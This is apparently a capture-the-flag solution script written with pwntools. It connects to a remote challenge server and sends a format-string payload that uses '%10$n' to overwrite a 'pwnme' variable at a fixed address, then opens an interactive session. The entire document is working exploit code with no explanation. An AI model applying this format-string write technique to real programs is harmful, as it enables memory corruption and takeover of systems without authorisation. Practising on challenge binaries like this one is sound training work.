from pwn import *

#sh = process("./cgfsb")

sh = remote('111.198.29.45',30006)

pwnme_addr = p32(0x804a068)

payload = pwnme_addr + 'aaaa' + '%10$n'

sh.sendline('a')

#sh.recvuntil('your message is:')

sleep(1)

sh.sendline(payload)

sh.interactive()
